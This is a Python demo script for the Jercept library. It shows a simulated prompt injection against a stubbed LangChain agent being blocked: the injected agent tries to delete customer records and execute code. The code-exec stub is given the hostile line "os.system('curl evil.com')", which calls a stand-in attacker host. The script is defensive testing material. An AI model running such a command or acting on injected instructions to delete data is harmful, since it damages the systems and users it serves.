"""
Jercept · LangChain-specific Demo
====================================
Shows prompt injection being blocked when using a LangChain AgentExecutor.

Run:
    export OPENAI_API_KEY=sk-...
    pip install jercept[langchain]
    python examples/demo_langchain.py
"""
from __future__ import annotations

import asyncio
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from jercept import protect_agent, IBACScopeViolation

GREEN = "\033[92m"
RED   = "\033[91m"
CYAN  = "\033[96m"
BOLD  = "\033[1m"
DIM   = "\033[2m"
RESET = "\033[0m"

# ── Simulated database ───────────────────────────────────────────────────────
_RECORDS = {
    "42": {"customer": "Globex Corp", "invoice": "$9,800", "due": "2026-04-01"},
}


# ── Tool functions (would be decorated with @tool in real LangChain code) ───

def sql_query_customer(customer_id: str) -> str:
    """Run a read-only SQL query against the customers table."""
    record = _RECORDS.get(customer_id, {})
    return f"Customer data: {record}" if record else f"No record for id={customer_id}"


def delete_customer_records(table: str) -> str:
    """DANGER: drop all records from a table."""
    return f"DELETED all rows from {table}!"


def execute_python_code(code: str) -> str:
    """Execute arbitrary Python code on the server."""
    return f"Executed: {code[:80]}"


# ── Minimal LangChain-compatible stubs ──────────────────────────────────────

class FakeLangchainTool:
    """Minimal duck-typed LangChain BaseTool."""

    def __init__(self, name: str, fn, *args, **kwargs):
        self.name = name
        self.description = f"LangChain tool: {name}"
        self._fn = fn
        self._args = args
        self._kwargs = kwargs
        self.call_count = 0

    def _run(self, *a, **kw):
        self.call_count += 1
        return self._fn(*self._args, **self._kwargs)

    async def _arun(self, *a, **kw):
        self.call_count += 1
        return self._fn(*self._args, **self._kwargs)


class FakeLangchainExecutor:
    """Simulates a LangChain AgentExecutor."""

    def __init__(self, tools: list[FakeLangchainTool], calls: list[str]):
        self.tools = tools
        self._calls = calls
        self._tool_map = {t.name: t for t in tools}
        # Attributes AgentExecutor detection looks for
        self.agent = None

    async def ainvoke(self, inputs: dict, **kwargs) -> dict:
        results = []
        for name in self._calls:
            tool = self._tool_map[name]
            result = await tool._arun()
            results.append(f"[{name}] → {result}")
        return {"output": "\n".join(results)}


# ── Demo ─────────────────────────────────────────────────────────────────────

async def main() -> None:
    print(f"\n{BOLD}{'═'*60}{RESET}")
    print(f"{BOLD}  Jercept  ·  LangChain Adapter Demo{RESET}")
    print(f"{BOLD}{'═'*60}{RESET}\n")

    read_tool   = FakeLangchainTool("sql_query_customer",    sql_query_customer,    "42")
    delete_tool = FakeLangchainTool("delete_customer_records", delete_customer_records, "customers")
    exec_tool   = FakeLangchainTool("execute_python_code",   execute_python_code,   "import os; os.system('curl evil.com')")
    all_tools   = [read_tool, delete_tool, exec_tool]

    # ── TEST 1: Legitimate ────────────────────────────────────────────────────
    print(f"{CYAN}TEST 1 — Legitimate request (LangChain){RESET}")
    print(f"  User: \"Look up invoice for customer 42\"\n")

    legit_agent = FakeLangchainExecutor(tools=all_tools, calls=["sql_query_customer"])
    protected   = protect_agent(legit_agent)

    try:
        result = await protected.run("Look up invoice for customer 42")
        print(f"  {GREEN}✓ Allowed — result returned:{RESET}")
        print(f"    {result}\n")
        print(f"  Scope:{RESET} {protected.session_scope['allowed_actions']}")
        print(f"  {GREEN}✓ TEST 1 PASSED{RESET}\n")
    except Exception as exc:
        print(f"  {RED}✗ TEST 1 FAILED: {exc}{RESET}\n")

    # ── TEST 2: Injected agent tries to delete + execute ─────────────────────
    print(f"{CYAN}TEST 2 — Prompt injection via LangChain (delete + code exec){RESET}")
    print(f"  User: \"Look up invoice for customer 42\"")
    print(f"  {RED}Injected:{RESET} agent also tries delete_customer_records + execute_python_code\n")

    injected_agent = FakeLangchainExecutor(
        tools=all_tools,
        calls=["sql_query_customer", "delete_customer_records", "execute_python_code"]
    )
    protected2 = protect_agent(injected_agent)

    try:
        await protected2.run("Look up invoice for customer 42")
        print(f"  {RED}✗ TEST 2 FAILED — Attack NOT blocked{RESET}\n")
    except IBACScopeViolation as exc:
        print(f"  {RED}╔══════════════════════════════════════════╗{RESET}")
        print(f"  {RED}║  🛑 INJECTION BLOCKED by IBAC             ║{RESET}")
        print(f"  {RED}║  Attempted: {exc.action:<29}║{RESET}")
        print(f"  {RED}╚══════════════════════════════════════════╝{RESET}")
        print(f"\n  Audit trail:")
        for e in protected2.audit_trail:
            icon = f"{GREEN}✓{RESET}" if e["permitted"] else f"{RED}✗{RESET}"
            print(f"    {icon} {e['action']:<20} fn={e['fn_name']}")

        print(f"\n  Was attacked: {BOLD}{RED}{protected2.was_attacked}{RESET}")
        print(f"  Blocked:      {RED}{protected2.blocked_actions}{RESET}")
        print(f"\n  {BOLD}{GREEN}✓ TEST 2 PASSED — LangChain injection blocked.{RESET}\n")

    print(f"{BOLD}{'═'*60}{RESET}")
    print(f"{BOLD}{GREEN}  LangChain agent secured. Zero code changes needed.{RESET}")
    print(f"{BOLD}{'═'*60}{RESET}\n")


if __name__ == "__main__":
    asyncio.run(main())
